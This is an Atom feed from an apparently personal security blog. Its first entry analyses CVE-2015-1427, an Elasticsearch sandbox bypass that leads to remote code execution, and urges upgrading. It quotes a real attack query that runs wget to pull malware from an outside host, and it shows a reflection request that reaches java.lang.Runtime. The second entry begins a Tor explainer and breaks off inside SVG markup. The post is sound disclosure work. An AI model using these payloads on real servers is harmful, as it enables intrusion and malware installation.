<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2015-03-08T13:36:33-05:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Remote Code Execution in Elasticsearch - CVE-2015-1427]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"/>
    <updated>2015-03-08T13:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elk_rce.png"/></p>

<blockquote><p>TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later <strong>now</strong>.</p></blockquote>

<p>Elasticsearch (the &ldquo;E&rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).</p>

<blockquote><p>Much of the analysis discovering this vulnerability was originally found on a blog post <a href="http://drops.wooyun.org/papers/5107">here</a> (<a href="https://translate.google.com/translate?hl=en&amp;sl=zh-CN&amp;tl=en&amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107">translated</a>). This post aims to translate and provide more detail on the vulnerability.</p></blockquote>

<!--more-->


<h3>This Isn&rsquo;t Elasticsearch&rsquo;s First Rodeo</h3>

<p>One feature of the <code>_search</code> API endpoint is to allow users to <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html">submit Groovy code</a> in the search query itself. The server will then execute the code in a sandboxed environment, returning the result to the user. This way, the elasticsearch code can be used to execute&hellip; more code<sup>1</sup></p>

<p>Allowing anybody to submit server-side code to get executed is a <em>dangerous</em> game to play. In fact, this isn&rsquo;t the first time Elasticsearch has been bitten by this feature. Elasticsearch pre-1.2 didn&rsquo;t have a sandbox <em>at all</em>, and allowed anyone to submit code to be executed. Since there are zero authentication controls built into elasticsearch, if the service is exposed to the Internet, anyone can own a server with a query like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{"query":
</span><span class='line'>    {"filtered": {
</span><span class='line'>        "query": {"match_all": {}}}},
</span><span class='line'>        "script_fields": {"exp": {
</span><span class='line'>            "script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/malware http://x.x.x.x/malware \").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"
</span><span class='line'>    }}}</span></code></pre></td></tr></table></div></figure>


<blockquote><p>Fun fact! This is an actual exploit attempt I&rsquo;ve seen on my server.</p></blockquote>

<p>This isn&rsquo;t anything new. In fact, there&rsquo;s a <a href="http://www.rapid7.com/db/modules/exploit/multi/elasticsearch/script_mvel_rce">Metasploit module</a> that makes this easy.</p>

<p>Starting with version 1.3, Elasticsearch <a href="http://www.elasticsearch.org/blog/scripting/">allowed sending Groovy scripts</a> in the query again. However, they added a sandbox to control what classes and functions can be executed.</p>

<p>Let&rsquo;s take a quick look at how the sandbox works to get a feel for how it can be exploited.</p>

<h3>How the Sandbox Works</h3>

<p>The functions and classes that are allowed by the sandbox are found in <a href="https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java"><code>GroovySandboxExpressionChecker.java</code></a>. Looking at the code, we notice the function <code>isAuthorized</code>. This function takes in an expression and checks to see if it is allowed to be executed.</p>

<p>Without going through <strong>everything</strong> the sandbox does, here&rsquo;s the important part of the function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">expression</span> <span class="k">instanceof</span> <span class="n">MethodCallExpression</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">MethodCallExpression</span> <span class="n">mce</span> <span class="o">=</span> <span class="o">(</span><span class="n">MethodCallExpression</span><span class="o">)</span> <span class="n">expression</span><span class="o">;</span>
</span><span class='line'>    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethodAsString</span><span class="o">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethod</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">GStringExpression</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// We do not allow GStrings for method invocation, they are a security risk</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="c1">//snip</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the condition that checks to see if our method call is allowed to be executed. There are two checks we need to bypass in order to make this happen:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>methodBlacklist</code> contains the following method calls that we can&rsquo;t use:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultMethodBlacklist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
</span><span class='line'>    <span class="s">&quot;getClass&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;wait&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;notify&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;notifyAll&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;finalize&quot;</span>
</span><span class='line'><span class="o">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so we can&rsquo;t use any of those. Next, we need to make sure that our method name isn&rsquo;t null, and we don&rsquo;t use a <a href="http://groovy.codehaus.org/api/org/codehaus/groovy/ast/expr/GStringExpression.html"><code>GStringExpression</code></a>. No problem.</p>

<p>There&rsquo;s one more hurdle that we have to overcome. This sandbox also restricts the packages that can have methods called on them (from <a href="https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854"><code>SecureASTCustomizer.java</code></a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">receiversWhiteList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">receiversWhiteList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">receiversBlackList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">receiversBlackList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The whitelist for elasticsearch is found in the variable <code>defaultReceiverWhitelist</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultReceiverWhitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span> <span class="o">[]</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">groovy</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">GroovyCollections</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Math</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="s">&quot;[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[[I&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="c1">//snip</span>
</span><span class='line'><span class="o">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the surface, this eliminates our ability to call any methods on interesting packages, such as <code>java.lang.Runtime</code>, which could be used to execute system commands. However, there&rsquo;s a way we can bypass both the package whitelist and the method blacklist to execute our code. This is done through a tricky Java feature called <a href="http://docs.oracle.com/javase/tutorial/reflect/"><code>reflection</code></a>.</p>

<h3>Bypassing the Sandbox with Reflection</h3>

<p>Vulnerabilities can often be reverse-engineered by inspecting the patches since the previous release. The commit that we will look at is <a href="https://github.com/elasticsearch/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47">here</a>. The changes in this commit give us some hints about how we can exploit the vulnerability:</p>

<p><img src="http://jordan-wright.github.io/images/blog/elk/rce.png"/></p>

<p>This makes it pretty clear that we can probably do something with the <code>.class</code> and <code>.forName()</code> method calls. These methods, chained together, allow us to take one package class (such as one found in the whitelist) and use it to load a reference to a completely separate class (such as <code>java.lang.Runtime</code>) via reflection.</p>

<p>So what does this look like?</p>

<p>Let&rsquo;s see if we can load the <code>java.lang.Runtime</code> package by using reflection off of the <code>java.lang.Math</code> package, which is in the whitelist of packages we can use:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ curl http://localhost:9200/_search?pretty -XPOST -d &#39;{&quot;script_fields&quot;: {&quot;myscript&quot;: {&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;)&quot;}}}&#39;
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>  &lt;snip&gt;
</span><span class='line'>  &quot;hits&quot; : {
</span><span class='line'>    &quot;total&quot; : 8,
</span><span class='line'>    &quot;max_score&quot; : 1.0,
</span><span class='line'>    &quot;hits&quot; : [ {
</span><span class='line'>      &lt;snip&gt;
</span><span class='line'>      &quot;fields&quot; : {
</span><span class='line'>        &quot;myscript&quot; : [ &quot;class java.lang.Runtime&quot; ]
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>}}
</span></code></pre></td></tr></table></div></figure>


<p><em>Success!</em> We can see the result of our query returned an instance of the <code>java.lang.Runtime</code> class. We can use this instance to execute system commands on the server.</p>

<p>I won&rsquo;t provide a full proof-of-concept, but all the pieces are here. Using a mix of the first exploit shown above along with the way I&rsquo;ve shown to get a reference to the <code>java.lang.Runtime</code> package, it is pretty straightforward to run whatever commands you want.</p>

<h3>Conclusion</h3>

<p>This vulnerability was not heavily advertised, but it is absolutely critical. In fact, I had one of my own elasticsearch instances compromised this way, showing this vulnerability is heavily being exploited in the wild.</p>

<p>Elasticsearch recommends to only allow the software to be accessed locally, but there are a <em>ton</em> of publicly available ES instances. This is likely because the default configuration listens on <code>0.0.0.0:9200</code>.</p>

<p>If you use elasticsearch, and haven&rsquo;t upgraded to 1.4.3 (or the latest 1.4.4), I recommend upgrading <strong>immediately</strong>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><sup>1</sup> There&rsquo;s an Xzibit joke to be made here.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Tor Works: Part One]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/28/how-tor-works-part-one/"/>
    <updated>2015-02-28T18:00:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/28/how-tor-works-part-one</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/how_tor_works_1.png"/></p>

<h3>Introduction</h3>

<p>Tor is an anonymity tool used by those who want to stay private and uncensored when browsing the Internet. Over time, it&rsquo;s grown to be pretty darn good at this. This makes the security, stability, and speed of the underlying network critical to those depending on it.</p>

<p>But how does Tor work under the hood? In this series of posts, we&rsquo;ll take a deep dive into the structure and protocols used by the Tor network in order to see first-hand how Tor operates.</p>

<!--more-->


<h3>Brief History of Tor</h3>

<p>The concept of Onion Routing (more on why it&rsquo;s called this later) was first <a href="http://www.onion-router.net/History.html">proposed</a> in 1995, where it was first funded by the <a href="http://www.onr.navy.mil/">Office of Naval Research</a> (ONR) and later helped out by DARPA in 1997. Since then, funding for the Tor Project has been provided by a <a href="https://www.torproject.org/about/sponsors.html.en">number of different sponsors</a>, and the Tor Project was recently announced a winner of the <a href="http://www.redditblog.com/2015/02/announcing-winners-of-reddit-donate.html">reddit donate</a> campaign.</p>

<p>The Tor software as we know it today was originally open-sourced in October of 2003, and is the 3<sup>rd</sup> generation of Onion Routing software. This idea of Onion Routing was (and is!) simply that we can wrap traffic in encrypted layers (like <em>onions</em>) in order to protect the contents of the data as well as the anonymity of the sender and receiver.</p>

<h3>Tor 101</h3>

<p>Now that we know a bit about Tor&rsquo;s history, let&rsquo;s talk about how it works. At an <em>extremely</em> high level, Tor works by bouncing connections from your computer to destinations (such as google.com) through a series of intermediate computers, or <strong>relays</strong>.</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   width="100%"
   height="482"
   style="max-height:250px;"
   onclick="d.reset().play();"
   viewBox="0 0 748 483"
   id="earth"
   version="1.1">
  <defs
     id="defs5976" />
  <g
     inkscape:label="Layer 1"
     inkscape:groupmode="layer"
     id="layer1"
     transform="translate(-135.6,-230.9)">
    <g
       id="g6088"
       transform="matrix(9.9,0,0,9.9,135.6,230.9)"
       style="fill:#ffffff">
      <g
         id="g6036"
         style="fill:#ffffff">
    <g
   id="g6038"
   style="fill:#ffffff">
        <polygon
   id="polygon6040"
   points="35.5,9.4 34.7,9.5 34.5,9.9 34.5,10.2 34.9,10.5 35.4,10.8 35.4,11.1 34.9,11.2 34.8,12.0 35.5,12.0 36.3,11.9 36.8,11.4 36.3,11.2 36.0,10.9 35.7,10.3 "
   style="fill:#ffffff" />

        <polygon
   id="polygon6042"
   points="33.8,10.5 33.3,11.2 33.3,11.7 33.8,11.7 34.8,11.1 34.8,10.6 34.4,10.4 "
   style="fill:#ffffff" />

        <path
   id="path6044"
   d="m 22.4,13.1 -0.1,0.3 h -0.6 v 0.3 h 0.1 c 0,0 0.0,0.0 0.0,0.1 l 0.3,-0.0 0.2,-0.1 0.0,-0.3 0.3,-0.0 0.1,-0.2 -0.2,-0.0 -0.2,0.0 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

        <polygon
   id="polygon6046"
   points="20.8,13.7 20.7,14.0 21.2,14.0 21.2,13.7 21.0,13.4 "
   style="fill:#ffffff" />

        <path
   id="path6048"
   d="M 48.6,24.0 C 48.6,23.3 48.5,22.6 48.5,21.9 48.2,19.6 47.7,17.4 46.9,15.3 46.8,15.1 46.7,15.0 46.7,14.8 45.6,12.2 44.0,9.8 42.1,7.8 42.0,7.6 41.9,7.5 41.7,7.4 41.4,7.0 41.0,6.6 40.6,6.3 36.3,2.4 30.6,0 24.3,0 17.9,0 12.1,2.4 7.8,6.4 6.8,7.3 5.9,8.3 5.0,9.4 1.8,13.5 0,18.7 0,24.3 c 0,13.4 10.9,24.3 24.3,24.3 9.4,0 17.6,-5.4 21.6,-13.2 0.8,-1.6 1.5,-3.4 1.9,-5.3 0.1,-0.4 0.2,-0.9 0.3,-1.4 0.2,-1.3 0.3,-2.8 0.3,-4.2 10e-4,-0.0 -0.0,-0.1 -0.0,-0.2 z m -4.5,-9.7 0.1,-0.1 c 0.1,0.3 0.3,0.7 0.5,1.0 l -0.2,-0.0 -0.4,0.0 V 14.3 z M 40.5,10.1 40.5,9.0 c 0.3,0.4 0.7,0.8 1.1,1.2 l -0.4,0.6 -1.5,-0.0 -0.0,-0.3 0.9,-0.4 z M 11.2,7.4 V 7.3 h 0.4 l 0.0,-0.1 h 0.7 v 0.3 l -0.2,0.3 h -1.0 l 10e-4,-0.4 0,0 z m 0.7,1.0 c 0,0 0.4,-0.0 0.5,-0.0 0.0,0 0,0.4 0,0.4 L 11.4,8.9 11.2,8.7 11.9,8.4 z m 33.6,9.6 h -1.7 l -1.0,-0.8 -1.1,0.1 v 0.6 h -0.3 l -0.3,-0.2 -1.9,-0.5 v -1.2 l -2.5,0.1 -0.7,0.4 h -0.9 l -0.4,-0.0 -1.2,0.6 v 1.2 l -2.4,1.7 0.2,0.7 h 0.5 L 31,21.8 l -0.3,0.1 -0.0,1.8 2.1,2.4 h 0.9 l 0.0,-0.1 h 1.6 l 0.4,-0.4 h 0.9 l 0.5,0.5 1.4,0.1 -0.1,1.8 1.5,2.7 -0.8,1.5 0.0,0.7 0.6,0.6 v 1.7 l 0.8,1.1 v 1.4 h 0.7 c -4.0,5.0 -10.3,8.2 -17.3,8.2 C 12.0,46.6 2,36.6 2,24.3 2,21.2 2.6,18.2 3.7,15.5 V 14.8 L 4.5,13.9 C 4.8,13.3 5.1,12.8 5.4,12.3 L 5.5,12.7 4.5,13.9 C 4.2,14.4 4.0,15.0 3.7,15.5 v 1.2 l 0.9,0.4 v 1.7 l 0.8,1.5 0.7,0.1 0.0,-0.5 -0.8,-1.3 -0.1,-1.2 h 0.5 l 0.2,1.3 1.2,1.7 -0.3,0.5 0.7,1.1 1.9,0.4 v -0.3 l 0.7,0.1 -0.0,0.5 0.6,0.1 0.9,0.2 1.3,1.5 1.7,0.1 0.1,1.3 -1.1,0.8 -0.0,1.2 -0.1,0.7 1.6,2.1 0.1,0.7 c 0,0 0.6,0.1 0.6,0.1 0.0,0 1.3,0.9 1.3,0.9 v 3.8 l 0.4,0.1 -0.3,1.7 0.7,1.0 -0.1,1.7 1.0,1.8 1.3,1.1 1.3,0.0 0.1,-0.4 -0.9,-0.8 0.0,-0.4 0.1,-0.5 0.0,-0.5 -0.6,-0.0 -0.3,-0.4 0.5,-0.5 0.0,-0.3 -0.6,-0.1 0.0,-0.3 0.8,-0.1 1.3,-0.6 0.4,-0.8 1.3,-1.7 -0.3,-1.3 0.4,-0.7 1.2,0.0 0.8,-0.6 0.2,-2.6 0.9,-1.2 0.1,-0.7 -0.8,-0.2 -0.5,-0.9 -1.9,-0.0 -1.5,-0.5 -0.0,-1.1 -0.5,-0.9 -1.4,-0.0 -0.8,-1.2 -0.7,-0.3 -0.0,0.3 -1.3,0.0 -0.4,-0.6 -1.3,-0.2 -1.1,1.3 -1.7,-0.3 -0.1,-2.0 -1.2,-0.2 0.5,-0.9 -0.1,-0.5 -1.7,1.1 -1.0,-0.1 -0.3,-0.8 0.2,-0.8 0.5,-1.0 1.3,-0.6 2.6,-0.0 -0.0,0.8 0.9,0.4 -0.0,-1.3 0.6,-0.6 1.3,-0.9 0.0,-0.6 1.3,-1.4 1.4,-0.8 -0.1,-0.1 0.9,-0.9 0.3,0.0 0.1,0.2 0.3,-0.4 0.0,-0.0 -0.4,-0.0 -0.4,-0.1 v -0.4 l 0.2,-0.1 h 0.4 l 0.2,0.0 0.1,0.3 0.2,-0.0 v -0.0 l 0.0,0.0 0.6,-0.1 0.0,-0.3 0.3,0.0 v 0.3 l -0.3,0.2 h 10e-4 l 0.0,0.3 1.2,0.3 c 0,0 10e-4,0.0 0.0,0.0 l 0.2,-0.0 0.0,-0.5 -0.9,-0.4 -0.0,-0.2 0.8,-0.2 0.0,-0.7 -0.8,-0.5 -0.0,-1.3 -1.1,0.5 h -0.4 l 0.1,-1.0 -1.5,-0.3 -0.6,0.4 v 1.5 l -1.1,0.3 -0.4,0.9 -0.5,0.0 V 10.5 L 16.9,10.3 16.3,10.0 16.1,9.2 18.1,8.0 19.0,7.7 19.1,8.4 19.7,8.3 19.7,8.0 20.3,7.9 20.3,7.8 20.1,7.7 20.0,7.4 l 0.6,-0.0 0.4,-0.4 0.0,-0.0 0.0,0.0 0.1,-0.1 1.4,-0.1 0.6,0.5 -1.6,0.9 2.1,0.5 0.2,-0.7 h 0.9 L 25.4,7.1 24.7,7.0 V 6.2 L 22.6,5.2 21.2,5.4 20.4,5.8 20.4,6.9 19.6,6.7 19.5,6.2 20.3,5.4 18.8,5.3 l -0.4,0.1 -0.1,0.5 0.5,0.0 -0.1,0.5 -0.9,0.0 -0.1,0.3 -1.3,0.0 c 0,0 -0.0,-0.7 -0.0,-0.7 -0.0,0 1.0,-0.0 1.0,-0.0 L 18.0,5.5 17.5,5.3 16.9,5.8 15.9,5.8 15.3,5.0 H 14.1 L 12.8,6.0 h 1.2 l 0.1,0.3 -0.3,0.2 1.3,0.0 0.2,0.4 L 13.8,7.1 13.7,6.7 12.8,6.5 12.3,6.2 11.2,6.2 C 14.8,3.5 19.4,2 24.3,2 c 5.6,0 10.7,2.1 14.7,5.5 l -0.2,0.4 -1.0,0.4 -0.4,0.4 0.1,0.5 0.5,0.0 0.3,0.8 0.9,-0.3 0.1,1.0 h -0.2 l -0.7,-0.1 -0.8,0.1 -0.8,1.1 -1.1,0.1 -0.1,0.9 0.4,0.1 -0.1,0.6 -1.1,-0.2 -1.0,0.2 -0.2,0.5 0.1,1.2 0.6,0.2 1.0,-0.0 0.6,-0.0 0.2,-0.5 1.0,-1.4 0.7,0.1 0.7,-0.6 0.1,0.5 1.7,1.1 -0.2,0.2 -0.7,-0.0 0.3,0.4 0.4,0.1 0.5,-0.2 -0.0,-0.6 0.2,-0.1 -0.2,-0.2 -1.1,-0.6 -0.3,-0.8 h 0.9 l 0.3,0.3 0.8,0.7 0.0,0.8 0.8,0.9 0.3,-1.2 0.5,-0.3 0.1,1.0 0.5,0.6 1.1,-0.0 c 0.2,0.5 0.4,1.1 0.6,1.7 l -0.1,0.1 z m -32.3,-7.0 0.5,-0.2 0.5,0.1 -0.1,0.7 -0.5,0.1 -0.3,-0.7 z m 3.0,1.6 v 0.4 h -1.3 l -0.5,-0.1 0.1,-0.3 0.6,-0.2 h 0.8 v 0.2 h 0.1 z m 0.6,0.6 V 13.8 l -0.3,0.2 -0.4,0.0 c 0,0 0,-0.6 0,-0.7 h 0.7 z m -0.3,-0.1 v -0.5 l 0.4,0.4 -0.4,0.1 z m 0.2,1.0 v 0.4 l -0.3,0.3 h -0.7 l 0.1,-0.4 0.3,-0.0 0.0,-0.1 0.5,-0.0 z m -1.7,-0.8 h 0.7 l -0.9,1.3 -0.3,-0.2 0.0,-0.5 0.5,-0.5 z m 3.0,0.7 v 0.4 H 17.3 l -0.1,-0.2 v -0.4 h 0.0 l 0.8,0.2 z m -0.6,-0.5 0.2,-0.2 0.3,0.2 -0.2,0.2 -0.2,-0.2 z m 28.5,5.7 0.0,-0.0 c 0.0,0.1 0.0,0.2 0.0,0.3 l -0.1,-0.2 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

        <path
   id="path6050"
   d="M 3.7,14.8 V 15.5 C 4.0,15.0 4.2,14.4 4.5,13.9 l -0.7,0.9 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

    </g>

</g>
      <g
         id="g6052"
         style="fill:#ffffff">
</g>
      <g
         id="g6054"
         style="fill:#ffffff">
</g>
      <g
         id="g6056"
         style="fill:#ffffff">
</g>
      <g
         id="g6058"
         style="fill:#ffffff">
</g>
      <g
         id="g6060"
         style="fill:#ffffff">
</g>
      <g
         id="g6062"
         style="fill:#ffffff">
</g>
      <g
         id="g6064"
         style="fill:#ffffff">
</g>
      <g
         id="g6066"
         style="fill:#ffffff">
</g>
      <g
         id="g6068"
         style="fill:#ffffff">
</g>
      <g
         id="g6070"
         style="fill:#ffffff">
</g>
      <g
         id="g6072"
         style="fill:#ffffff">
</g>
      <g
         id="g6074"
         style="fill:#ffffff">
</g>
      <g
         id="g6076"
         style="fill:#ffffff">
</g>
      <g
         id="g6078"
         style="fill:#ffffff">
</g>
      <g
         id="g6080"
         style="fill:#ffffff">
</g>
    </g>
    <path
       style="fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 292.9,394.7 c 0,0 85.8,-133.3 186.8,20.2"
       id="path6115"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 479.8,414.9 c 0,0 87.8,-141.4 56.5,63.6"
       id="path6625"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 401.4,247.1 c 0,0 -142.8,-90.7 -216.4,33.5"
       id="path6627"
       inkscape:connector-curvature="0"
       transform="translate(135.6,230.9)" />
    <path
       style="fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 185.7,280.0 c 0,0 17.8,-149.2 -93.5,-107.1"
       id="path6629"
       inkscape:connector-curvature="0"
       transform="translate(135.6,230.9)" />
    <path
       style="fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.2,283.4 39.3,0"
       id="path6631"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.7,338.5 39.3,0"
       id="path6631-4"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
